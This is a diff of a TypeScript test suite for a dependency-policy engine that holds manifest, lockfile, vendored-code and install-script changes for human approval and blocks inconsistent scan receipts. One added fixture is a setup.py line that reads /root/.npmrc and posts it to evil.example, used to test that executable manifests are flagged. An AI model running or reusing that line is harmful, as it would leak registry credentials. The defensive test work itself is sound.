@@ -1069,8 +1069,15 @@ test('dependency policy is strict, optional and compared as a weakening surface'
     assert.throws(() => parsePolicy({ ...policy, dependencies: invalid }), JSON.stringify(invalid));
 
   const disabled = policyFixture({ dependencies: null });
+  // Enabling is compared with the strictest settings, so every loosened field is named.
   assert.deepEqual(weakeningCodes(comparePolicies(disabled, policyFixture({ revision: 2 }))), [
+    'dependency_hold_severity_changed:high->critical',
     'dependency_verification_enabled',
+    'license_allowed:Apache-2.0',
+    'license_allowed:BSD-3-Clause',
+    'license_allowed:ISC',
+    'license_allowed:MIT',
+    'limit_raised:dependencies.scanner.databaseMaxAgeMs',
   ]);
   assert.deepEqual(
     weakeningCodes(comparePolicies(policy, policyFixture({ revision: 2, dependencies: null }))),
@@ -1233,8 +1240,12 @@ test('deterministic dependency checks hold for a human; approval binds the exact
   >;
   const expectations: [Parameters<typeof dependencyFor>[2], string][] = [
     [{ resolution: 'mismatch' }, 'lockfile_not_reproducible'],
-    [{ rootScriptsChanged: true }, 'manifest_scripts_changed'],
-    [{ packageInstallScripts: true }, 'install_scripts_in_dependencies'],
+    [
+      { manifestFieldsChanged: ['scripts.postinstall'] },
+      'manifest_field_changed:scripts.postinstall',
+    ],
+    [{ manifestFieldsChanged: ['overrides'] }, 'manifest_field_changed:overrides'],
+    [{ installScriptsChanged: true }, 'install_scripts_changed'],
     [
       {
         packages: {
@@ -1246,7 +1257,13 @@ test('deterministic dependency checks hold for a human; approval binds the exact
       'new_dependency:npm/dayjs',
     ],
     [
-      { packages: { added: [], removed: [], upgraded: [{ ...upgraded, major: true }] } },
+      {
+        packages: {
+          added: [],
+          removed: [],
+          upgraded: [{ ...upgraded, version: '2.0.0', major: true }],
+        },
+      },
       'major_upgrade:npm/left-pad',
     ],
     [
@@ -1273,7 +1290,11 @@ test('deterministic dependency checks hold for a human; approval binds the exact
   // Removed packages carry no license obligation.
   assert.equal(
     withReceipt({
-      packages: { added: [], removed: [{ ...upgraded, license: null }], upgraded: [] },
+      packages: {
+        added: [],
+        removed: [{ ...upgraded, previousVersion: null, license: null }],
+        upgraded: [],
+      },
     }).outcome,
     'allow',
   );
@@ -1290,7 +1311,7 @@ test('deterministic dependency checks hold for a human; approval binds the exact
     packages: {
       added: [{ ...upgraded, name: 'dayjs', previousVersion: null }],
       removed: [],
-      upgraded: [{ ...upgraded, major: true }],
+      upgraded: [{ ...upgraded, version: '2.0.0', major: true }],
     },
   });
   assert.equal(
@@ -1422,5 +1443,182 @@ test('inconclusive, stale, re-rooted or malformed dependency receipts block', ()
       packages: { added: [], removed: [], upgraded: [{ name: 'x' }] },
     },
     'dependency_receipt_invalid',
+  );
+});
+
+test('a receipt covers only the manifests it lists; executable manifests and vendored code stay critical', () => {
+  const policy = policyFixture({ allowedPaths: ['.'] });
+  const exfiltration =
+    "from urllib.request import urlopen\nurlopen('https://evil.example', open('/root/.npmrc','rb').read())\n";
+  for (const [file, expected] of [
+    [added('setup.py', exfiltration), 'dependency_manifest_executable'],
+    [added('build.gradle.kts', 'x\n'), 'dependency_manifest_executable'],
+    [added('Gemfile', "gem 'x'\n"), 'dependency_manifest_executable'],
+    [added('requirements.txt', 'left-pad==1\n'), 'dependency_manifest'],
+    [added('vendor/lodash/index.js', 'x\n'), 'vendored_dependency'],
+    [added('patches/lodash@4.17.21.patch', 'x\n'), 'dependency_configuration'],
+    [added('.yarn/releases/yarn-4.cjs', 'x\n'), 'dependency_configuration'],
+    [added('gradle/wrapper/gradle-wrapper.properties', 'x\n'), 'dependency_configuration'],
+    [added('.node-version', '24\n'), 'dependency_configuration'],
+  ] as const) {
+    const request = requestFor(policy, 'publish', manifest(LOCKFILE_BUMP, file));
+    const decision = decide(
+      policy,
+      request,
+      { ...evidenceFor(policy, request), dependency: dependencyFor(policy, request) },
+      NOW,
+    );
+    assert.equal(decision.outcome, 'approval_required', expected);
+    assert.ok(codes(decision).includes(expected), `${expected}: ${codes(decision)}`);
+    assert.ok(
+      !codes(decision).includes('dependency_manifest') || expected === 'dependency_manifest',
+      'covered lockfile is routine',
+    );
+  }
+  // A manifest the receipt did not list stays critical even though the lockfile it did list is routine.
+  const uncovered = requestFor(
+    policy,
+    'merge',
+    manifest(LOCKFILE_BUMP, added('requirements.txt', 'left-pad==1\n')),
+  );
+  const partial = decide(
+    policy,
+    uncovered,
+    { ...evidenceFor(policy, uncovered), dependency: dependencyFor(policy, uncovered) },
+    NOW,
+  );
+  assert.equal(partial.outcome, 'approval_required');
+  assert.deepEqual(
+    partial.reasons
+      .filter((reason) => reason.code === 'dependency_manifest')
+      .map((reason) => reason.path),
+    ['requirements.txt'],
+  );
+  // A receipt that names a manifest outside the change describes some other change.
+  const foreign = decide(
+    policy,
+    uncovered,
+    {
+      ...evidenceFor(policy, uncovered),
+      dependency: dependencyFor(policy, uncovered, { manifests: ['package-lock.json', 'go.mod'] }),
+    },
+    NOW,
+  );
+  assert.equal(foreign.outcome, 'blocked');
+  assert.ok(codes(foreign).includes('dependency_receipt_inconsistent'));
+});
+
+test('non-registry sources, inconsistent package stories and omitted findings are handled', () => {
+  const policy = policyFixture({
+    allowedPaths: ['.'],
+    dependencies: {
+      ...(policyFixture().dependencies as NonNullable<
+        ReturnType<typeof policyFixture>['dependencies']
+      >),
+      allowNewDependencies: true,
+      allowMajorUpgrades: true,
+    },
+  });
+  const request = requestFor(policy, 'merge', manifest(LOCKFILE_BUMP));
+  const base = dependencyFor(policy, request).packages.upgraded[0] as NonNullable<
+    ReturnType<typeof dependencyFor>['packages']['upgraded'][0]
+  >;
+  const decideWith = (overrides: Parameters<typeof dependencyFor>[2]) =>
+    decide(
+      policy,
+      request,
+      { ...evidenceFor(policy, request), dependency: dependencyFor(policy, request, overrides) },
+      NOW,
+    );
+  for (const source of ['git', 'url', 'file', 'link', 'workspace'] as const) {
+    const decision = decideWith({
+      packages: {
+        added: [{ ...base, name: 'dayjs', previousVersion: null, source }],
+        removed: [],
+        upgraded: [],
+      },
+    });
+    assert.equal(decision.outcome, 'approval_required', source);
+    assert.ok(codes(decision).includes('dependency_source_not_registry:npm/dayjs'));
+  }
+  // The runner's `major` flag must agree with the versions it reports.
+  assert.equal(
+    decideWith({
+      packages: { added: [], removed: [], upgraded: [{ ...base, version: '2.0.0', major: false }] },
+    }).outcome,
+    'blocked',
+  );
+  assert.equal(
+    decideWith({ packages: { added: [], removed: [], upgraded: [{ ...base, major: true }] } })
+      .outcome,
+    'blocked',
+  );
+  // Removal plus addition of one package is an upgrade the runner must report as such.
+  const dodge = decideWith({
+    packages: {
+      added: [{ ...base, version: '2.0.0', previousVersion: null }],
+      removed: [{ ...base, previousVersion: null }],
+      upgraded: [],
+    },
+  });
+  assert.equal(dodge.outcome, 'blocked');
+  assert.ok(codes(dodge).includes('dependency_receipt_inconsistent'));
+  assert.equal(
+    decideWith({ packages: { added: [{ ...base, name: 'dayjs' }], removed: [], upgraded: [] } })
+      .outcome,
+    'blocked',
+    'added with previousVersion',
+  );
+  // Findings below the hold threshold may be omitted; omitting at or above it leaves no evidence.
+  const low = {
+    id: 'GHSA-low',
+    severity: 'low',
+    ecosystem: 'npm',
+    name: 'left-pad',
+    version: '1.3.1',
+    fixedVersion: null,
+  } as const;
+  assert.equal(decideWith({ findingsOmittedBelow: 'critical' }).outcome, 'allow');
+  assert.equal(decideWith({ findingsOmittedBelow: 'high' }).outcome, 'allow');
+  assert.ok(
+    codes(decideWith({ findingsOmittedBelow: 'high', findings: [low] })).includes(
+      'dependency_receipt_inconsistent',
+    ),
+  );
+  const strict = policyFixture({
+    allowedPaths: ['.'],
+    dependencies: {
+      ...(policyFixture().dependencies as NonNullable<
+        ReturnType<typeof policyFixture>['dependencies']
+      >),
+      holdSeverity: 'high',
+    },
+  });
+  const strictRequest = requestFor(strict, 'merge', manifest(LOCKFILE_BUMP));
+  const incomplete = decide(
+    strict,
+    strictRequest,
+    {
+      ...evidenceFor(strict, strictRequest),
+      dependency: dependencyFor(strict, strictRequest, { findingsOmittedBelow: 'critical' }),
+    },
+    NOW,
+  );
+  assert.equal(incomplete.outcome, 'blocked');
+  assert.ok(codes(incomplete).includes('dependency_findings_incomplete'));
+  // A malformed receipt is refused even when verification is not configured.
+  const disabled = policyFixture({ allowedPaths: ['.'], dependencies: null });
+  const disabledRequest = requestFor(disabled, 'merge', manifest(LOCKFILE_BUMP));
+  assert.equal(
+    decide(
+      disabled,
+      disabledRequest,
+      {
+        ...evidenceFor(disabled, disabledRequest),
+        dependency: { ...dependencyFor(disabled, disabledRequest), extra: true },
+      },
+      NOW,
+    ).outcome,
+    'blocked',
   );
 });
